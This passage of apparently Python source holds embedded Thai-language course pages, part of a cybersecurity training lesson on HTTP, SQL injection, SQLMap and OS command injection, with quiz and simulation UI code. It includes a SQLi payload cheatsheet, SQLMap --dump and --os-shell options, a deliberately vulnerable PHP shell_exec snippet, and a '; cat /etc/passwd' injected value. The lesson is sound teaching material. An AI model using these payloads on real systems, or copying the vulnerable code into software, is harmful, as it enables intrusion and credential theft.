      g.querySelectorAll('.mini-opt').forEach(function(o) {
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
  } else {
    var errorPct = Math.round((score / groups.length) * 100);
    if (fill) { fill.setAttribute('stroke-dasharray', errorPct + ', 100'); fill.style.stroke = '#ff007f'; }
    if (text) text.textContent = errorPct + '%';
    if (status_txt) status_txt.textContent = 'ตอบไม่ถูกต้อง ลองใหม่!';

    status.style.background = 'rgba(255,0,127,0.08)';
    status.style.border = '1px solid rgba(255,0,127,0.25)';
    status.style.color = '#ff007f';
    status.innerHTML = '❌ <strong>ยังไม่ผ่าน!</strong> คุณได้คะแนน ' + score + '/2 (ทำข้อสอบไม่จบตาม Gauge Bar Progress) กรุณาทบทวนบทเรียนและตรวจเลือกคำตอบใหม่อีกครั้ง';
  }
}

setTimeout(function() {
  var solved = localStorage.getItem('solved_lesson_177');
  if (solved === 'solved') {
    var box = document.getElementById('mq-box-177');
    var groups = box.querySelectorAll('.mq-q');
    groups.forEach(function(g) {
      var correctVal = g.getAttribute('data-correct');
      g.querySelectorAll('.mini-opt').forEach(function(o) {
        var val = o.getAttribute('data-val');
        if (val === correctVal) {
          o.classList.add('selected', 'correct');
        }
        o.style.pointerEvents = 'none';
      });
    });
    box.querySelector('.mq-btn-check').disabled = true;
    
    var fill = document.getElementById('lesson-gauge-fill-177');
    var text = document.getElementById('lesson-gauge-text-177');
    var status_txt = document.getElementById('lesson-status-txt-177');
    var status = document.getElementById('mq-status-177');
    
    if (fill) { fill.setAttribute('stroke-dasharray', '100, 100'); fill.style.stroke = '#3ddc84'; }
    if (text) text.textContent = '100%';
    if (status_txt) status_txt.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> ปลดล็อกบทเรียนถัดไปแล้ว</span>';
    
    status.style.display = 'block';
    status.style.background = 'rgba(61,220,132,0.08)';
    status.style.border = '1px solid rgba(61,220,132,0.25)';
    status.style.color = '#3ddc84';
    status.innerHTML = '🏆 <strong>LESSON CLEARED!</strong> คุณผ่านการประเมินความรู้ท้ายบทเรียนย่อยนี้เรียบร้อย (คะแนน 2/2) สามารถเดินทางไปศึกษาบทเรียนถัดไปได้ครับ!';
  }
}, 200);
</script>
"""

# ─── Lesson 178 ───
val178_0 = """## 💉 HTTP Anatomy, SQL Injection & OS Command Injections (โครงสร้างเว็บแอปพลิเคชันและการฝังคำสั่งโจมตี)
---

ยินดีต้อนรับสู่บทเรียนโครงสร้าง HTTP Message, ทฤษฎีและแนวทางการเจาะระบบผ่านช่องโหว่ SQL Injection และ OS Command Injection

### 📄 SLIDE 59-75: HTTP Message Anatomy (โครงสร้างทราฟฟิกเว็บแอปพลิเคชัน)
- **HTTP Request**: ประกอบด้วย Method (GET, POST), Path, Protocol, Headers, และ Body
- **HTTP Response**: ประกอบด้วย Status Line (200 OK, 404, 500), Headers, และ Body
- **cURL Command**: สั่งดึงเฉพาะ Header ของเป้าหมายเพื่อตรวจความปลอดภัย:
  ```bash
  curl -I https://www.example.com
  ```

<div class="cyber-diag-wrapper">
  <style>
    .cyber-diag-wrapper { background: #070a13; border: 1px solid rgba(0, 240, 255, 0.15); border-radius: 12px; padding: 20px; text-align: center; margin: 15px auto; }
    .diag-title { font-size: 0.75rem; color: #00f0ff; font-weight: bold; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.05em; text-align: center; text-shadow: 0 0 8px rgba(0, 240, 255, 0.4); }
  </style>
  <div class="diag-title">📊 Graphic: HTTP Message Anatomy Breakdown</div>
  <svg viewBox="0 0 450 180" style="width: 100%; height: auto; display: block; margin: 0 auto; background: #03050a; border-radius: 8px;">
    <!-- HTTP Request Block -->
    <g transform="translate(15, 20)">
      <rect x="0" y="0" width="190" height="140" rx="8" fill="#0f1322" stroke="#00f0ff" stroke-width="1.5"/>
      <text x="95" y="20" fill="#00f0ff" font-size="10" font-family="sans-serif" font-weight="bold" text-anchor="middle">HTTP Request (Client -> Server)</text>
      <g transform="translate(10, 32)">
        <text x="0" y="12" fill="#e2e8f0" font-size="7.5" font-family="monospace"><tspan fill="#38bdf8" font-weight="bold">GET</tspan> /index.php?id=1 HTTP/1.1</text>
        <text x="0" y="27" fill="#64748b" font-size="7" font-family="monospace">Host: target.com</text>
        <text x="0" y="39" fill="#64748b" font-size="7" font-family="monospace">User-Agent: Mozilla/5.0 ...</text>
        <text x="0" y="51" fill="#64748b" font-size="7" font-family="monospace">Cookie: session=xyz123</text>
        <line x1="0" y1="62" x2="170" y2="62" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>
        <text x="0" y="74" fill="#a7f3d0" font-size="7" font-family="monospace">Request Headers (Metadata)</text>
        <text x="0" y="86" fill="#fca5a5" font-size="7" font-family="monospace">Request Body (Data - for POST)</text>
      </g>
    </g>
    <!-- Arrow -->
    <path d="M215,90 L235,90" fill="none" stroke="#64748b" stroke-width="1.5"/>
    <polygon points="235,90 229,86 229,94" fill="#64748b"/>
    <!-- HTTP Response Block -->
    <g transform="translate(245, 20)">
      <rect x="0" y="0" width="190" height="140" rx="8" fill="#0f1322" stroke="#34d399" stroke-width="1.5"/>
      <text x="95" y="20" fill="#34d399" font-size="10" font-family="sans-serif" font-weight="bold" text-anchor="middle">HTTP Response (Server -> Client)</text>
      <g transform="translate(10, 32)">
        <text x="0" y="12" fill="#e2e8f0" font-size="7.5" font-family="monospace">HTTP/1.1 <tspan fill="#34d399" font-weight="bold">200 OK</tspan></text>
        <text x="0" y="27" fill="#64748b" font-size="7" font-family="monospace">Server: Apache/2.4.41</text>
        <text x="0" y="39" fill="#64748b" font-size="7" font-family="monospace">Content-Type: text/html</text>
        <text x="0" y="51" fill="#64748b" font-size="7" font-family="monospace">Set-Cookie: session=xyz123</text>
        <line x1="0" y1="62" x2="170" y2="62" stroke="rgba(255,255,255,0.05)" stroke-width="1"/>
        <text x="0" y="74" fill="#64748b" font-size="7" font-family="monospace">&lt;html&gt;&lt;body&gt;</text>
        <text x="10" y="86" fill="#3ddc84" font-size="7.5" font-family="monospace" font-weight="bold">Welcome to CTF!</text>
        <text x="0" y="98" fill="#64748b" font-size="7" font-family="monospace">&lt;/body&gt;&lt;/html&gt;</text>
      </g>
    </g>
  </svg>
</div>

---

### 📄 SLIDE 76-90: Malicious HTTP Message Detections
- **Unusual HTTP Methods**: การรันเมธอดพิเศษ เช่น OPTIONS, TRACE หรือ WebDAV (MKCOL, COPY) เพื่อสืบค้นโครงสร้างระบบ
- **Unusual User-Agents**: การแสกนอัตโนมัติที่ระบุ User-Agent ชัดเจน เช่น `sqlmap/1.7.2` หรือ `python-requests`
- **Large/Encoded POST**: การซ่อน Web Shell หรือ Payload ที่เข้ารหัส Base64/Hex เพื่อข้ามผ่านตัวกรอง

---

### 📄 SLIDE 91-100: SQL Injection (SQLi) Introduction & Concepts
- **SQL Injection (SQLi)**: การนำข้อมูลนำเข้าจากผู้ใช้ไปรวมใน SQL Query โดยตรง ทำให้ผู้โจมตีแทรกคำสั่งลอบผ่านการตรวจสอบสิทธิ์หรือเข้าถึงฐานข้อมูลได้
- **ลิงก์ศึกษาการป้องกัน SQLi**: [How to Stop SQL Injection](https://www.indusface.com/blog/how-to-stop-sql-injection/)

<div class="cyber-diag-wrapper">
  <div class="diag-title">📊 Graphic: SQL Injection Authentication Bypass Concept</div>
  <svg viewBox="0 0 450 180" style="width: 100%; height: auto; display: block; margin: 0 auto; background: #03050a; border-radius: 8px;">
    <!-- Normal Login -->
    <g transform="translate(15, 15)">
      <rect x="0" y="0" width="195" height="150" rx="8" fill="#0f1322" stroke="#3b82f6" stroke-width="1.5"/>
      <text x="97" y="18" fill="#3b82f6" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">1. Normal Auth Flow (Username/Password Checked)</text>
      <g transform="translate(10, 32)">
        <text x="0" y="10" fill="#cbd5e1" font-size="7" font-family="sans-serif">Input: admin / p@ssW0rd</text>
        <rect x="0" y="18" width="175" height="40" rx="4" fill="#02040a" stroke="rgba(255,255,255,0.05)" stroke-width="0.75"/>
        <text x="8" y="32" fill="#a7f3d0" font-size="6.5" font-family="monospace">SELECT * FROM users WHERE</text>
        <text x="8" y="44" fill="#a7f3d0" font-size="6.5" font-family="monospace">user='admin' AND pass='p@ssW0rd'</text>
        <text x="0" y="75" fill="#94a3b8" font-size="7" font-family="sans-serif">Database logic result:</text>
        <rect x="0" y="82" width="175" height="22" rx="4" fill="rgba(52, 211, 153, 0.1)" stroke="#34d399" stroke-width="0.75"/>
        <text x="87.5" y="96" fill="#34d399" font-size="7" font-family="monospace" font-weight="bold" text-anchor="middle">True AND True = ACCESS GRANTED</text>
      </g>
    </g>
    <!-- Bypass Login -->
    <g transform="translate(240, 15)">
      <rect x="0" y="0" width="195" height="150" rx="8" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
      <text x="97" y="18" fill="#ef4444" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">2. Bypassed Auth Flow (Password Ignored)</text>
      <g transform="translate(10, 32)">
        <text x="0" y="10" fill="#cbd5e1" font-size="7" font-family="sans-serif">Input: admin' -- / xxx</text>
        <rect x="0" y="18" width="175" height="40" rx="4" fill="#02040a" stroke="rgba(255,255,255,0.05)" stroke-width="0.75"/>
        <text x="8" y="32" fill="#fca5a5" font-size="6.5" font-family="monospace">SELECT * FROM users WHERE</text>
        <text x="8" y="44" fill="#fca5a5" font-size="6.5" font-family="monospace">user='admin' <tspan fill="#f43f5e" font-weight="bold">--' AND pass='xxx'</tspan></text>
        <text x="0" y="75" fill="#94a3b8" font-size="7" font-family="sans-serif">Database logic result:</text>
        <rect x="0" y="82" width="175" height="22" rx="4" fill="rgba(239, 68, 68, 0.1)" stroke="#ef4444" stroke-width="0.75"/>
        <text x="87.5" y="96" fill="#ef4444" font-size="7" font-family="monospace" font-weight="bold" text-anchor="middle">True (Password Check Commented Out)</text>
      </g>
    </g>
  </svg>
</div>

---

### 📄 SLIDE 101-110: Advanced SQL Injection Techniques
- **UNION-Based SQLi**: การดึงข้อมูลข้ามตารางมารวมกับผลลัพธ์คิวรีหลัก
- **Error-Based SQLi**: การบังคับให้ระบบส่งข้อความเอเรอร์ที่ซ่อนข้อมูลระบบ/รหัสผ่านออกมา
- **Blind SQLi (Boolean/Time-Based)**: ดึงข้อมูลทีละตัวอักษรโดยใช้ตรรกะ จริง-เท็จ หรือการสั่ง Sleep หน่วงเวลาเซิร์ฟเวอร์
- **Out-of-Band (OOB) SQLi**: สั่งการให้ระบบส่งข้อมูลออกไปยังเซิร์ฟเวอร์ภายนอกของแฮกเกอร์โดยตรง

---

### 📄 SLIDE 111-125: SQL Injection Payload Cheatsheet
<div style="overflow-x: auto; margin: 1.5rem 0; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px;">
<table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 0.74rem;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 10px; font-weight: bold; width: 180px;">Category</th>
<th style="padding: 10px; font-weight: bold; font-family: monospace;">Payload</th>
<th style="padding: 10px; font-weight: bold;">Description</th>
</tr>
</thead>
<tbody style="color: #cbd5e1;">
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td>Auth Bypass</td>
<td style="font-family: monospace; color: #f43f5e;">' OR '1'='1' --</td>
<td>ข้ามผ่านขั้นตอนการตรวจสอบสิทธิ์รหัสผ่าน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td>Auth Bypass (Cont)</td>
<td style="font-family: monospace; color: #f43f5e;">admin' --</td>
<td>ล็อกอินเข้าบัญชี admin โดยการตัดคอมเมนต์รหัสผ่านหลังบ้าน</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04); background: rgba(0,0,0,0.15);">
<td>UNION-Based</td>
<td style="font-family: monospace; color: #3b82f6;">' UNION SELECT null, username, password FROM users --</td>
<td>ดึงบัญชีและรหัสผ่านจากตาราง users ออกมา</td>
</tr>
<tr style="border-bottom: 1px solid rgba(255,255,255,0.04);">
<td>Time-Based Blind</td>
<td style="font-family: monospace; color: #a855f7;">' OR IF(1=1, SLEEP(5), 0) --</td>
<td>สั่งหน่วงเวลาระบบ 5 วินาทีหากเงื่อนไขเป็นจริง</td>
</tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 126-140: SQL Injections: SQLMap (เครื่องมือเจาะระบบฐานข้อมูลอัตโนมัติ)
**SQLMap** คือโปรแกรมภาษา Python แบบ Command Line ยอดนิยมระดับโลกที่ออกแบบมาเพื่อสืบค้นหาช่องโหว่ วิเคราะห์ และดำเนินการโจมตีช่องโหว่ประเภท SQL Injection บนเว็บบอร์ดหรือแอปพลิเคชันเป้าหมายได้โดยอัตโนมัติ:
- สามารถสแกนและดึงสคีมาฐานข้อมูล, รายชื่อผู้ใช้ รหัสผ่านแฮช และเข้าครอบครองสิทธิ์การรันคำสั่งเครื่องแม่ข่ายเซิร์ฟเวอร์ย่อยได้
- **ลิงก์ศึกษาการใช้งาน**: [TryHackMe SQLMap Room](https://tryhackme.com/room/sqlmap)

<div class="cyber-diag-wrapper">
  <div class="diag-title">📊 Graphic: SQLMap Automated Exploitation Pipeline</div>
  <svg viewBox="0 0 450 120" style="width: 100%; height: auto; display: block; margin: 0 auto; background: #03050a; border-radius: 8px;">
    <!-- Step 1 -->
    <g transform="translate(10, 35)">
      <rect x="0" y="0" width="85" height="50" rx="6" fill="#0f1322" stroke="#00f0ff" stroke-width="1.5"/>
      <text x="42.5" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">1. Discovery</text>
      <text x="42.5" y="34" fill="#00f0ff" font-size="7" font-family="monospace" text-anchor="middle">sqlmap -u [URL]</text>
    </g>
    <path d="M95,60 L115,60" fill="none" stroke="#64748b" stroke-width="1.5"/>
    <polygon points="115,60 109,56 109,64" fill="#64748b"/>
    <!-- Step 2 -->
    <g transform="translate(120, 35)">
      <rect x="0" y="0" width="85" height="50" rx="6" fill="#0f1322" stroke="#a855f7" stroke-width="1.5"/>
      <text x="42.5" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">2. Testing</text>
      <text x="42.5" y="34" fill="#a855f7" font-size="7" font-family="monospace" text-anchor="middle">Detect SQLi type</text>
    </g>
    <path d="M205,60 L225,60" fill="none" stroke="#64748b" stroke-width="1.5"/>
    <polygon points="225,60 219,56 219,64" fill="#64748b"/>
    <!-- Step 3 -->
    <g transform="translate(230, 35)">
      <rect x="0" y="0" width="85" height="50" rx="6" fill="#0f1322" stroke="#fbbf24" stroke-width="1.5"/>
      <text x="42.5" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">3. Enumeration</text>
      <text x="42.5" y="34" fill="#fbbf24" font-size="7" font-family="monospace" text-anchor="middle">--dbs --tables</text>
    </g>
    <path d="M315,60 L335,60" fill="none" stroke="#64748b" stroke-width="1.5"/>
    <polygon points="335,60 329,56 329,64" fill="#64748b"/>
    <!-- Step 4 -->
    <g transform="translate(340, 35)">
      <rect x="0" y="0" width="100" height="50" rx="6" fill="#0f1322" stroke="#34d399" stroke-width="1.5"/>
      <text x="50" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">4. Extraction</text>
      <text x="50" y="34" fill="#34d399" font-size="7" font-family="monospace" text-anchor="middle">--dump passwords</text>
    </g>
  </svg>
</div>

#### 🛠️ ตารางสรุปออปชันคำสั่งยอดนิยมของ SQLMap (Cheatsheet)
<div style="overflow-x: auto; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 1.5rem; font-size:0.73rem;">
<table style="width: 100%; border-collapse: collapse; text-align: left;">
<thead>
<tr style="background: rgba(255,255,255,0.03); border-bottom: 1px solid rgba(255,255,255,0.08); color: #00f0ff;">
<th style="padding: 8px; font-weight: bold; width: 160px;">Option</th>
<th style="padding: 8px; font-weight: bold;">Description</th>
</tr>
</thead>
<tbody>
<tr><td style="font-family: monospace; color: #a7f3d0; padding: 8px;">-u &lt;URL&gt;</td><td style="padding: 8px;">ระบุ URL เป้าหมาย (เช่น <code>-u "http://target.com/index.php?id=1"</code>)</td></tr>
<tr><td style="font-family: monospace; color: #a7f3d0; padding: 8px;">--dbs</td><td style="padding: 8px;">ดึงรายชื่อฐานข้อมูล (Databases) ทั้งหมดที่อยู่ในเครื่องเป้าหมาย</td></tr>
<tr><td style="font-family: monospace; color: #a7f3d0; padding: 8px;">--tables</td><td style="padding: 8px;">ดึงรายชื่อตาราง (Tables) ทั้งหมดที่มีอยู่ในฐานข้อมูลที่เลือก</td></tr>
<tr><td style="font-family: monospace; color: #a7f3d0; padding: 8px;">--dump</td><td style="padding: 8px;">ดาวน์โหลดข้อมูลทั้งหมดในตารางหรือคอลัมน์ที่เลือก</td></tr>
<tr><td style="font-family: monospace; color: #a7f3d0; padding: 8px;">--os-shell</td><td style="padding: 8px;">เปิดหน้า Terminal Shell สำหรับรันคำสั่งควบคุมระบบปฏิบัติการหลังบ้าน</td></tr>
</tbody>
</table>
</div>

---

### 📄 SLIDE 151-160: OS Command Injections (ภัยคุกคามการแทรกฝังคำสั่งควบคุมเซิร์ฟเวอร์)
- **Command Injection**: เกิดจากการที่เว็บแอปพลิเคชันนำอินพุตของผู้ใช้ไปเรียกใช้ในฟังก์ชันระบบหลังบ้านตรงๆ (เช่น `shell_exec`, `system` บนเซิร์ฟเวอร์ย่อย) ทำให้แฮกเกอร์สามารถใช้สัญลักษณ์คั่นคำสั่ง (เช่น `;`, `&`, `|`, `&&`) แทรกคำสั่งควบคุมภายนอกเข้ามาประหารงานได้
- **ตัวอย่างโค้ด PHP ที่เปราะบาง**:
  ```php
  <?php
    $ip = $_GET['ip'];
    $output = shell_exec("ping -c 4 " . $ip);
    echo "<pre>" . $output . "</pre>";
  ?>
  ```
- **ตัวอย่างการโจมตี**: แฮกเกอร์ส่งค่า IP เป็น `'127.0.0.1 ; cat /etc/passwd'` ส่งผลให้ระบบรันคำสั่ง Ping และคำสั่งดึงรายชื่อผู้ใช้ระบบส่งกลับมาให้ทันที

<div class="cyber-diag-wrapper">
  <div class="diag-title">📊 Graphic: OS Command Injection Flow</div>
  <svg viewBox="0 0 450 140" style="width: 100%; height: auto; display: block; margin: 0 auto; background: #03050a; border-radius: 8px;">
    <!-- Input Box -->
    <g transform="translate(15, 45)">
      <rect x="0" y="0" width="130" height="50" rx="6" fill="#0f1322" stroke="#00f0ff" stroke-width="1.5"/>
      <text x="65" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">User Input</text>
      <text x="65" y="36" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">8.8.8.8 ; cat /etc/passwd</text>
    </g>
    <path d="M145,70 L175,70" fill="none" stroke="#ef4444" stroke-width="1.5"/>
    <polygon points="175,70 169,66 169,74" fill="#ef4444"/>
    <!-- Vulnerable Function -->
    <g transform="translate(185, 30)">
      <rect x="0" y="0" width="115" height="80" rx="6" fill="#0f1322" stroke="#fbbf24" stroke-width="1.5"/>
      <text x="57.5" y="20" fill="#ffffff" font-size="9" font-family="sans-serif" font-weight="bold" text-anchor="middle">Web Server Code</text>
      <text x="57.5" y="38" fill="#cbd5e1" font-size="7.5" font-family="monospace" text-anchor="middle">system("ping -c 4 " + ip)</text>
      <rect x="5" y="52" width="105" height="20" rx="3" fill="rgba(239, 68, 68, 0.15)" stroke="#ef4444" stroke-width="0.5"/>
      <text x="57.5" y="65" fill="#ef4444" font-size="7.5" font-family="monospace" text-anchor="middle" font-weight="bold">No Input Sanitization</text>
    </g>
    <path d="M300,70 L330,70" fill="none" stroke="#ef4444" stroke-width="1.5"/>
    <polygon points="330,70 324,66 324,74" fill="#ef4444"/>
    <!-- Executed command in OS -->
    <g transform="translate(340, 45)">
      <rect x="0" y="0" width="95" height="50" rx="6" fill="#0f1322" stroke="#ef4444" stroke-width="1.5"/>
      <text x="47.5" y="20" fill="#ffffff" font-size="8.5" font-family="sans-serif" font-weight="bold" text-anchor="middle">OS Command Shell</text>
      <text x="47.5" y="34" fill="#ef4444" font-size="7" font-family="monospace" text-anchor="middle">Runs: cat /etc/passwd</text>
    </g>
  </svg>
</div>
"""


val178_1 = """### 💻 SQL Injection & SQLMap Simulation Sandbox (บอร์ดเรียนรู้จำลองการเจาะฐานข้อมูล)

คลิกหัวข้อด้านซ้ายมือเพื่อศึกษาขั้นตอน และ **กรอกข้อมูลหรือกดปุ่มเพื่อจำลองสถานการณ์จริง**:

<style type="text/css">
.w-sandbox-main { display: flex !important; gap: 20px !important; margin: 1.5rem auto !important; max-width: 1000px !important; }
.w-sandbox-nav { width: 220px !important; display: flex !important; flex-direction: column !important; gap: 8px !important; flex-shrink: 0 !important; }
.w-nav-item { background: rgba(255, 255, 255, 0.02) !important; border: 1px solid rgba(255, 255, 255, 0.06) !important; border-radius: 6px !important; padding: 10px 14px !important; color: #cbd5e1 !important; text-align: left !important; cursor: pointer !important; font-size: 0.78rem !important; transition: all 0.2s !important; }
.w-nav-item:hover, .w-nav-item.active { border-color: #00f0ff !important; color: #ffffff !important; background: rgba(0, 240, 255, 0.05) !important; }
.w-nav-item.active { font-weight: 700 !important; box-shadow: 0 0 8px rgba(0, 240, 255, 0.15) !important; }
.w-sandbox-panels { flex-grow: 1 !important; display: flex !important; flex-direction: column !important; gap: 14px !important; }
.w-sand-panel { display: none; background: #05070f !important; border: 1px solid rgba(255, 255, 255, 0.08) !important; border-radius: 10px !important; padding: 20px !important; box-shadow: 0 8px 24px rgba(0,0,0,0.45) !important; }
.w-sand-panel.active { display: block !important; }
.sim-input-box { background: rgba(15, 17, 26, 0.9) !important; border: 1px solid rgba(255,255,255,0.1) !important; border-radius: 6px !important; color: #ffffff !important; padding: 8px 12px !important; font-family: monospace !important; font-size: 0.85rem !important; width: 100% !important; margin-bottom: 12px !important; }
.sim-label { font-size: 0.78rem !important; color: #94a3b8 !important; font-weight: 800 !important; margin-bottom: 4px !important; display: block !important; }
</style>

<div class="w-sandbox-main">
<div class="w-sandbox-nav">
<button id="nav-item-sqli" class="w-nav-item active" onclick="showSandboxItem('sqli', this)">1. SQLi Auth Bypass</button>
<button id="nav-item-sqlmap" class="w-nav-item" onclick="showSandboxItem('sqlmap', this)">2. SQLMap Scanner</button>
</div>

<div class="w-sandbox-panels">
<div id="panel-sqli" class="w-sand-panel active">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>1. Simulated Authentication Bypass via SQLi</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); color: #00f0ff; font-family: monospace;">SQLi Bypass</span>
</div>
<div class="row">
  <div class="col-md-6">
    <span class="sim-label">Username (ป้อนข้อมูลผู้ใช้):</span>
    <input type="text" id="sim-user" class="sim-input-box" value="admin\' --" oninput="updateSQLPreview()">
    <span class="sim-label">Password (ป้อนรหัสผ่าน):</span>
    <input type="password" id="sim-pass" class="sim-input-box" value="anything" oninput="updateSQLPreview()">
    <button class="btn btn-info px-4 py-2 font-weight-bold w-100 mt-2" style="background:#00f0ff !important; border-color:#00f0ff !important; color:#02040a !important; font-size:0.8rem; border-radius:4px;" onclick="runSQLiSimulation()">▶ Test Bypass</button>
  </div>
  <div class="col-md-6">
    <span class="sim-label">Constructed Query:</span>
    <pre id="sim-query-preview" style="font-family: monospace; font-size: 0.72rem; color: #cbd5e1; white-space: pre-wrap; background: #02040a; padding: 12px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.05); min-height:85px; line-height: 1.5; margin:0 0 10px;"></pre>
    <span class="sim-label">Result:</span>
    <div id="sim-sqli-result" style="font-family: monospace; font-size: 0.75rem; color: #8a94a6; background: #02040a; padding: 12px; border-radius: 6px; border: 1px solid rgba(255,255,255,0.05); min-height:45px; display:flex; align-items:center;">
      [กรุณากดปุ่มเพื่อส่งข้อมูลจำลอง...]
    </div>
  </div>
</div>
</div>

<div id="panel-sqlmap" class="w-sand-panel" style="display: none;">
<div style="font-size: 0.95rem; font-weight: 800; color: #ffffff; border-bottom: 1px solid rgba(255,255,255,0.06); padding-bottom: 10px; margin-bottom: 14px; display: flex; justify-content: space-between; align-items: center;">
<span>2. Simulated SQLMap Scan</span>
<span style="font-size: 0.65rem; padding: 2px 8px; border-radius: 4px; background: rgba(0,240,255,0.08); border: 1px solid rgba(0,240,255,0.2); color: #00f0ff; font-family: monospace;">SQLMap Scanner</span>
</div>
<pre style="font-family: monospace; font-size: 0.8rem; color: #00f0ff; white-space: pre-wrap; margin: 0 0 12px; background: rgba(0,0,0,0.2); padding: 14px; border-radius: 8px; border: 1px solid rgba(255,255,255,0.02);">sqlmap -u "http://ctf.rpca.ac.th/view_profile.php?id=1" --dbs</pre>
<div style="background: #02040a; border: 1px solid rgba(255,255,255,0.06); border-radius: 8px; margin-bottom: 16px; overflow: hidden;">
<div style="background: rgba(255,255,255,0.03); padding: 6px 12px; border-bottom: 1px solid rgba(255,255,255,0.05); display: flex; justify-content: space-between; align-items: center;">
<span style="font-size: 0.65rem; color: #64748b; font-family: monospace;">🐚 Terminal Console</span>
<button style="background: rgba(0,240,255,0.1); border: 1px solid rgba(0,240,255,0.3); border-radius: 4px; color: #00f0ff; font-size: 0.68rem; padding: 3px 8px; cursor: pointer; font-family: monospace;" onclick="startSQLMapSimulation()">▶ Run SQLMap</button>
</div>
<div id="term-sqlmap" style="font-family: monospace; font-size: 0.74rem; color: #a7f3d0; padding: 12px 16px; white-space: pre-wrap; min-height: 120px; line-height: 1.5;">
<span style="color: #3ddc84;">kali$</span> [กดปุ่ม Run SQLMap เพื่อจำลองการสแกนระบบฐานข้อมูล]
</div>
</div>
</div>
</div>
</div>

<script>
window.showSandboxItem = function(itemKey, element) {
  const navButtons = document.querySelectorAll('.w-sandbox-nav button');
  navButtons.forEach(btn => {
    btn.style.borderColor = 'rgba(255, 255, 255, 0.06)';
    btn.style.color = '#cbd5e1';
    btn.style.background = 'rgba(255, 255, 255, 0.02)';
  });
  element.style.borderColor = '#00f0ff';
  element.style.color = '#ffffff';
  element.style.background = 'rgba(0, 240, 255, 0.05)';
  const panels = document.querySelectorAll('.w-sand-panel');
  panels.forEach(p => { p.style.display = 'none'; });
  const target = document.getElementById('panel-' + itemKey);
  if (target) { target.style.display = 'block'; }
}

window.updateSQLPreview = function() {
  var u = document.getElementById('sim-user').value;
  var p = document.getElementById('sim-pass').value;
  var preview = document.getElementById('sim-query-preview');
  if (preview) {
    preview.innerHTML = 'SELECT * FROM users\nWHERE username = \'<span style="color:#ff007f;">' + u + '</span>\'\nAND password = \'<span style="color:#00f0ff;">' + p + '</span>\';';
  }
}

window.runSQLiSimulation = function() {
  var u = document.getElementById('sim-user').value;
  var resultBox = document.getElementById('sim-sqli-result');
  if (!resultBox) return;
  resultBox.innerHTML = '<span style="color:#fbbf24;"><i class="fas fa-spinner fa-spin mr-1"></i> Running SQL checks...</span>';
  setTimeout(() => {
    if (u.includes("\' OR") || u.includes("\' --") || u.includes("--")) {
      resultBox.innerHTML = '<span style="color:#3ddc84; font-weight:bold;"><i class="fas fa-check-circle mr-1"></i> 🔑 Access Granted! Bypassed authentication password validation successfully!</span>';
    } else {
      resultBox.innerHTML = '<span style="color:#ff007f; font-weight:bold;"><i class="fas fa-times-circle mr-1"></i> ❌ Access Denied: Invalid credentials.</span>';
    }
  }, 800);
}

window.startSQLMapSimulation = function() {
  const term = document.getElementById('term-sqlmap');
  if (!term) return;
  term.innerHTML = '<span style="color:#64748b;">kali$</span> <span style="color:#ffffff; font-weight:bold;">sqlmap -u "http://ctf.rpca.ac.th/view_profile.php?id=1" --dbs</span>\n[.] testing connection to the target URL...';
  setTimeout(() => {
    term.innerHTML += '\n[!] heuristic test shows that GET parameter \'id\' might be injectable';
  }, 600);
  setTimeout(() => {
    term.innerHTML += '\n[+] UNION query (SQLi) injection technique detected on parameter \'id\'';
  }, 1200);
  setTimeout(() => {
    term.innerHTML += '\n[.] retrieving database names...\n\n[+] available databases [3]:\n<span style="color:#00f0ff;">[*] ctf_vulnerabilities</span>\n<span style="color:#00f0ff;">[*] information_schema</span>\n<span style="color:#00f0ff;">[*] users_database</span>\n\n<span style="color:#3ddc84; font-weight:bold;">[+] SQLMap execution completed successfully.</span>';
  }, 2000);
}

setTimeout(() => {
  if (typeof updateSQLPreview === 'function') updateSQLPreview();
}, 200);
</script>
"""

val178_2 = """### ✏️ Lesson Quick Quiz (แบบทดสอบทบทวนความรู้ท้ายบทเรียน)

ตอบคำถามประเมินความรู้ 2 ข้อด้านล่างนี้ให้ถูกต้องครบถ้วนเพื่อทำการผ่านบทเรียนย่อยนี้ (Lesson Clear):

<style>
.mini-quiz-box{width:100%;max-width:1050px;margin:2rem auto;background:rgba(15,17,26,0.45);border:1px solid rgba(255,255,255,0.06);border-radius:12px;padding:24px;box-shadow:0 8px 32px rgba(0,0,0,0.3);box-sizing:border-box;}
.mq-layout-container {display:flex; gap:24px; align-items:stretch;}
.mq-questions-col {flex:1;}
.mq-gauge-col {width:160px; display:flex; flex-direction:column; align-items:center; justify-content:center; border-left:1px solid rgba(255,255,255,0.06); padding-left:24px;}
@media (max-width: 768px) {
  .mq-layout-container {flex-direction:column;}
